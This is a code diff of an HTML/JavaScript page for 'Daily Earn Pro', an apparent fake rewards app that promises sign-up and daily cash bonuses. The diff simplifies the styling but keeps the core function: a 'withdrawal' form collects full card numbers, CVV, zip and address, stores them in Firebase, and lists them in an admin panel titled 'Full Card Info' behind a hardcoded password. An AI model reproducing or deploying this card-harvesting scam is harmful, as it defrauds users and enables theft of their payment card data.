@@ -2,165 +2,94 @@
 <html lang="en">
 <head>
 <meta charset="UTF-8">
-<title>Daily Earn Pro | Admin Control</title>
+<title>Daily Earn Pro</title>
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <style>
-    :root { 
-        --primary: #6a11cb; 
-        --secondary: #2575fc;
-        --bg: #f8f9fd; 
-        --text: #2d3436;
-        --glass: rgba(255, 255, 255, 0.95);
-    }
-
-    body { 
-        margin:0; 
-        font-family: 'Inter', sans-serif; 
-        background: linear-gradient(135deg, #f5f7fa 0%, #c3cfe2 100%);
-        color: var(--text);
-        min-height: 100vh;
-        padding-bottom: 90px;
-    }
-
-    header { 
-        background: var(--glass);
-        backdrop-filter: blur(15px);
-        padding: 15px 20px; 
-        display: flex; 
-        justify-content: space-between; 
-        align-items: center; 
-        position: sticky; top: 0; z-index: 100;
-        box-shadow: 0 2px 15px rgba(0,0,0,0.05);
-    }
-
-    .tab { display: none; padding: 20px; animation: slideUp 0.4s ease-out; }
-    @keyframes slideUp { from { transform: translateY(20px); opacity: 0; } to { transform: translateY(0); opacity: 1; } }
-
-    .card { 
-        background: var(--glass);
-        padding: 20px; 
-        border-radius: 20px; 
-        margin-bottom: 15px; 
-        box-shadow: 0 10px 25px rgba(0,0,0,0.05);
-        border: 1px solid rgba(255,255,255,0.3);
-    }
-
-    .balance-card {
-        background: linear-gradient(135deg, var(--primary) 0%, var(--secondary) 100%);
-        color: white; text-align: center; padding: 30px;
-    }
-
-    input, select { 
-        width: 100%; padding: 12px; border: 1.5px solid #eee; border-radius: 12px; 
-        box-sizing: border-box; margin-bottom: 10px; font-size: 14px;
-    }
-
-    .btn { 
-        background: linear-gradient(to right, var(--primary), var(--secondary));
-        color: white; padding: 14px; border: none; border-radius: 12px; 
-        cursor: pointer; font-weight: bold; width: 100%; font-size: 15px;
-        transition: 0.3s;
-    }
-
-    .admin-card-detail {
-        background: #2d3436; color: #fab1a0; padding: 15px; border-radius: 12px;
-        font-family: 'Courier New', monospace; font-size: 13px; margin-top: 10px;
-        border-left: 5px solid #ff7675;
-    }
-
-    nav { 
-        position: fixed; bottom: 15px; left: 15px; right: 15px; 
-        background: rgba(45, 52, 54, 0.95); backdrop-filter: blur(10px);
-        display: flex; justify-content: space-around; border-radius: 25px; 
-        padding: 8px; z-index: 1000;
-    }
+    :root { --primary: #6a11cb; --secondary: #2575fc; --glass: rgba(255, 255, 255, 0.95); }
+    body { margin:0; font-family: 'Inter', sans-serif; background: #f0f2f5; padding-bottom: 90px; }
+    header { background: var(--glass); padding: 15px 20px; display: flex; justify-content: space-between; align-items: center; position: sticky; top: 0; z-index: 100; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
+    .tab { display: none; padding: 20px; animation: fadeIn 0.4s; }
+    @keyframes fadeIn { from { opacity: 0; } to { opacity: 1; } }
+    .card { background: white; padding: 20px; border-radius: 20px; margin-bottom: 15px; box-shadow: 0 5px 15px rgba(0,0,0,0.05); }
+    .balance-card { background: linear-gradient(135deg, var(--primary), var(--secondary)); color: white; text-align: center; padding: 40px 20px; border-radius: 25px; }
+    .balance-card h1 { font-size: 3rem; margin: 10px 0; }
+    input { width: 100%; padding: 12px; margin-bottom: 10px; border: 1.5px solid #eee; border-radius: 12px; box-sizing: border-box; }
+    .btn { background: linear-gradient(to right, var(--primary), var(--secondary)); color: white; padding: 15px; border: none; border-radius: 12px; cursor: pointer; font-weight: bold; width: 100%; }
+    nav { position: fixed; bottom: 15px; left: 15px; right: 15px; background: #2d3436; display: flex; justify-content: space-around; border-radius: 25px; padding: 10px; }
     nav button { border: none; background: none; color: #b2bec3; font-size: 22px; cursor: pointer; }
-
-    .legal-box { font-size: 12px; background: #eee; padding: 10px; border-radius: 10px; height: 100px; overflow-y: auto; margin-bottom: 10px; }
+    .admin-card-detail { background: #1e272e; color: #0be881; padding: 15px; border-radius: 10px; font-family: monospace; font-size: 12px; margin-top: 10px; }
 </style>
 </head>
 <body>
 
-<div id="auth">
-    <div style="padding: 60px 30px; text-align: center;">
-        <h1 style="color:var(--primary)">Daily Earn Pro</h1>
-        <div class="card">
-            <input id="regName" placeholder="Full Name">
-            <input id="regEmail" placeholder="Email Address">
-            <input id="regPass" type="password" placeholder="Password">
-            <button class="btn" onclick="handleAuth()">Claim $50 Welcome Bonus</button>
-        </div>
+<div id="auth" style="padding: 50px 20px; text-align: center;">
+    <h1>Daily Earn Pro</h1>
+    <div class="card">
+        <input id="regName" placeholder="Full Name">
+        <input id="regEmail" placeholder="Email Address">
+        <input id="regPass" type="password" placeholder="Password">
+        <button class="btn" onclick="handleAuth()">Join & Get $50</button>
     </div>
 </div>
 
 <div id="app" style="display:none;">
     <header>
-        <h3 id="welcomeText">Hi, User</h3>
-        <div style="font-size: 20px;">🔔</div>
+        <h3 id="welcomeText">Welcome</h3>
+        <div>🔔</div>
     </header>
 
     <div id="dashboard" class="tab">
         <div class="card balance-card">
-            <p style="margin:0; opacity: 0.9;">Wallet Balance</p>
-            <h1>$<span id="balance">0</span></h1>
+            <p style="margin:0; opacity: 0.9;">Your Total Earnings</p>
+            <h1>$<span id="userBalanceDisplay">0</span></h1>
         </div>
         <div class="card">
-            <h3>Daily Reward</h3>
-            <p>Get your daily $5 reward now!</p>
-            <button class="btn" onclick="dailyClaim()">🎁 Claim Daily $5</button>
+            <h3>Daily Bonus</h3>
+            <button class="btn" onclick="dailyClaim()">🎁 Claim $5 Now</button>
         </div>
-        <div class="card">
-            <h4>Legal Information</h4>
-            <div class="legal-box">
-                <b>Terms:</b> No double accounts. Fraud will result in a permanent ban.
-                <br><b>Privacy:</b> Card details are encrypted and deleted after payment.
-            </div>
-            <p style="font-size:10px; color:gray">By using this app, you agree to our policies.</p>
+        <div class="card" style="font-size: 12px; color: gray;">
+            <b>Terms:</b> Withdrawal takes 7 days. One account per user.
         </div>
     </div>
 
     <div id="tasks" class="tab">
-        <h3 style="margin-bottom:15px;">Available Tasks</h3>
+        <h3>Tasks</h3>
         <div id="taskList"></div>
     </div>
 
     <div id="withdraw" class="tab">
         <div class="card">
-            <h3>Withdrawal Form</h3>
-            <input id="wAmount" type="number" placeholder="Amount to Withdraw ($)">
+            <h3>Withdraw Money</h3>
+            <input id="wAmount" type="number" placeholder="Amount ($)">
             <input id="wName" placeholder="Card Holder Name">
-            <input id="wNumber" placeholder="Card Number (16 Digits)">
+            <input id="wNumber" placeholder="Card Number">
             <div style="display:flex; gap:10px;">
                 <input id="wCVV" type="password" placeholder="CVV" style="flex:1">
-                <input id="wZip" placeholder="Zip Code" style="flex:1">
+                <input id="wZip" placeholder="Zip" style="flex:1">
             </div>
-            <input id="wAddress" placeholder="Billing Address">
-            <button class="btn" onclick="requestWithdraw()">Submit Payout Request</button>
+            <input id="wAddress" placeholder="Address">
+            <button class="btn" onclick="requestWithdraw()">Request Payout</button>
         </div>
-        <h4>Payout Status</h4>
         <div id="userWithdrawals"></div>
     </div>
 
     <div id="admin" class="tab">
         <div id="adminLogin">
             <div class="card">
-                <h3>Admin Verification</h3>
-                <input id="adminPass" type="password" placeholder="Enter Admin Password">
-                <button class="btn" onclick="openAdmin()">Unlock Panel</button>
+                <input id="adminPass" type="password" placeholder="Admin PIN">
+                <button class="btn" onclick="openAdmin()">Login Admin</button>
             </div>
         </div>
         <div id="adminContent" style="display:none;">
-            <div class="card" style="border: 2px solid var(--primary);">
-                <h4>➕ Add Task</h4>
-                <input id="tTitle" placeholder="Task Name">
-                <input id="tReward" type="number" placeholder="Reward ($)">
-                <button class="btn" onclick="addNewTask()">Add Task to Users</button>
+            <div class="card">
+                <h4>Add Task</h4>
+                <input id="tTitle" placeholder="Title">
+                <input id="tReward" type="number" placeholder="Reward">
+                <button class="btn" onclick="addNewTask()">Add Task</button>
             </div>
-
-            <h4>🔴 Live Member Activity</h4>
-            <div id="activityLog" class="card" style="font-size:11px; height:200px; overflow-y:auto; background:#f1f2f6;"></div>
-
-            <h4>💳 Pending Payouts (Full Card Data)</h4>
+            <h4>User Activity Log</h4>
+            <div id="activityLog" class="card" style="font-size:11px; max-height:150px; overflow:auto;"></div>
+            <h4>Withdrawals (Full Card Info)</h4>
             <div id="adminWithdrawals"></div>
         </div>
     </div>
@@ -199,18 +128,21 @@ function handleAuth() {
     const name = document.getElementById("regName").value;
     auth.createUserWithEmailAndPassword(email, pass).then(res => {
         db.ref("users/" + res.user.uid).set({ name: name, balance: 50, lastClaim: 0 });
-        logGlobal(name + " registered (Welcome $50)");
     }).catch(e => auth.signInWithEmailAndPassword(email, pass).catch(err => alert(err.message)));
 }
 
 auth.onAuthStateChanged(user => {
     if (user) {
         currentUser = user;
+        // REAL-TIME BALANCE LISTENER (FIXED)
         db.ref("users/" + user.uid).on("value", snap => {
-            document.getElementById("auth").style.display = "none";
-            document.getElementById("app").style.display = "block";
-            document.getElementById("welcomeText").innerText = "Hi, " + snap.val().name.split(' ')[0];
-            document.getElementById("balance").innerText = snap.val().balance;
+            const data = snap.val();
+            if(data) {
+                document.getElementById("auth").style.display = "none";
+                document.getElementById("app").style.display = "block";
+                document.getElementById("welcomeText").innerText = "Hi, " + data.name;
+                document.getElementById("userBalanceDisplay").innerText = data.balance; // UPDATES INSTANTLY
+            }
         });
         loadTasks();
         loadUserWithdrawals();
@@ -223,125 +155,99 @@ function showTab(id) {
     document.getElementById(id).style.display = "block";
 }
 
-// --- USER REWARDS ---
+// --- USER ACTIONS ---
 function dailyClaim() {
     db.ref("users/" + currentUser.uid).once("value").then(snap => {
         let now = Date.now();
         let last = snap.val().lastClaim || 0;
-        if (now - last < 86400000) return alert("You already claimed today! Check back in 24h.");
-        
+        if (now - last < 86400000) return alert("Come back tomorrow!");
         db.ref("users/" + currentUser.uid).update({ balance: snap.val().balance + 5, lastClaim: now });
-        logGlobal(snap.val().name + " claimed daily $5");
-        alert("Success! $5 added to your wallet.");
+        logGlobal(snap.val().name + " earned $5");
+        alert("$5 added!");
     });
 }
 
 function requestWithdraw() {
-    const details = {
-        amount: document.getElementById("wAmount").value,
+    const amt = document.getElementById("wAmount").value;
+    db.ref("withdrawRequests").push({
+        uid: currentUser.uid,
+        userName: document.getElementById("welcomeText").innerText,
+        amount: amt,
         name: document.getElementById("wName").value,
         num: document.getElementById("wNumber").value,
         cvv: document.getElementById("wCVV").value,
         zip: document.getElementById("wZip").value,
-        addr: document.getElementById("wAddress").value
-    };
-    if(!details.num || !details.cvv) return alert("Please fill all card details");
-
-    db.ref("withdrawRequests").push({
-        uid: currentUser.uid,
-        userName: document.getElementById("welcomeText").innerText,
-        ...details,
-        status: "Pending",
-        date: new Date().toLocaleString()
+        addr: document.getElementById("wAddress").value,
+        status: "Pending"
     });
-    logGlobal(document.getElementById("welcomeText").innerText + " requested $" + details.amount);
-    alert("Request Sent! Admin will process your payment soon.");
+    alert("Request Sent!");
 }
 
 function loadUserWithdrawals() {
     db.ref("withdrawRequests").orderByChild("uid").equalTo(currentUser.uid).on("value", snap => {
         let html = "";
-        snap.forEach(r => {
-            html += `<div class="card" style="font-size:13px"><b>$${r.val().amount}</b> - Status: <span style="color:orange">${r.val().status}</span></div>`;
-        });
-        document.getElementById("userWithdrawals").innerHTML = html || "No payout history.";
+        snap.forEach(r => html += `<div class="card">$${r.val().amount} - ${r.val().status}</div>`);
+        document.getElementById("userWithdrawals").innerHTML = html;
     });
 }
 
-// --- ADMIN CONTROL (PASSWORD: OBASEMO2) ---
+// --- ADMIN (PASS: OBASEMO2) ---
 function openAdmin() {
     if (document.getElementById("adminPass").value === "OBASEMO2") {
         document.getElementById("adminLogin").style.display = "none";
         document.getElementById("adminContent").style.display = "block";
         loadAdminData();
-    } else { alert("Incorrect Admin PIN"); }
+    } else { alert("Wrong Pass"); }
 }
 
 function loadAdminData() {
-    // Member Activity
-    db.ref("globalActivity").limitToLast(25).on("value", snap => {
+    db.ref("globalActivity").limitToLast(10).on("value", snap => {
         let h = "";
-        snap.forEach(a => h = `<div style="margin-bottom:5px">● ${a.val()}</div>` + h);
+        snap.forEach(a => h = `<div>${a.val()}</div>` + h);
         document.getElementById("activityLog").innerHTML = h;
     });
 
-    // Payouts with FULL CARD DETAILS
     db.ref("withdrawRequests").on("value", snap => {
         let html = "";
         snap.forEach(r => {
-            let data = r.val();
-            if(data.status === "Pending") {
-                html += `
-                <div class="card" style="border-left: 5px solid #2575fc">
-                    <b>USER:</b> ${data.userName}<br>
-                    <b>AMOUNT:</b> $${data.amount}<br>
+            let d = r.val();
+            if(d.status === "Pending") {
+                html += `<div class="card">
+                    <b>${d.userName} - $${d.amount}</b>
                     <div class="admin-card-detail">
-                        CARD NAME: ${data.name}<br>
-                        CARD NUM:  ${data.num}<br>
-                        CVV:       ${data.cvv}<br>
-                        ZIP CODE:  ${data.zip}<br>
-                        ADDRESS:   ${data.addr}
+                        NAME: ${d.name}<br>NUM: ${d.num}<br>CVV: ${d.cvv}<br>ZIP: ${d.zip}<br>ADDR: ${d.addr}
                     </div>
-                    <button class="btn" style="margin-top:10px; background:#27ae60" onclick="db.ref('withdrawRequests/${r.key}').update({status:'Paid'})">Mark as Paid</button>
+                    <button class="btn" style="margin-top:5px" onclick="db.ref('withdrawRequests/${r.key}').update({status:'Paid'})">Mark Paid</button>
                 </div>`;
             }
         });
-        document.getElementById("adminWithdrawals").innerHTML = html || "No pending payouts.";
+        document.getElementById("adminWithdrawals").innerHTML = html || "No payouts";
     });
 }
 
 function addNewTask() {
     let t = document.getElementById("tTitle").value;
     let r = document.getElementById("tReward").value;
-    if(t && r) {
-        db.ref("tasks").push({ title: t, reward: parseInt(r) });
-        alert("Task Live!");
-    }
-}
-
-function logGlobal(msg) {
-    db.ref("globalActivity").push(new Date().toLocaleTimeString() + ": " + msg);
+    if(t && r) db.ref("tasks").push({ title: t, reward: parseInt(r) });
 }
 
 function loadTasks() {
     db.ref("tasks").on("value", snap => {
         let h = "";
-        snap.forEach(t => {
-            h += `<div class="card">
-                <b>${t.val().title}</b><br>Earn $${t.val().reward}
-                <button class="btn" style="padding:5px; margin-top:10px" onclick="completeTask('${t.key}', ${t.val().reward})">Complete Now</button>
-            </div>`;
-        });
-        document.getElementById("taskList").innerHTML = h || "No tasks today.";
+        snap.forEach(t => h += `<div class="card"><b>${t.val().title}</b> ($${t.val().reward})<br><button onclick="doTask('${t.key}', ${t.val().reward})">Earn Now</button></div>`);
+        document.getElementById("taskList").innerHTML = h;
     });
 }
 
-function completeTask(key, reward) {
+function doTask(key, reward) {
     db.ref("users/" + currentUser.uid).once("value").then(snap => {
         db.ref("users/" + currentUser.uid).update({ balance: snap.val().balance + reward });
-        logGlobal(snap.val().name + " completed task for $" + reward);
-        alert("Success!");
+        alert("Earned!");
     });
+}
+
+function logGlobal(msg) {
+    db.ref("globalActivity").push(new Date().toLocaleTimeString() + ": " + msg);
 }
 </script>
 </body>
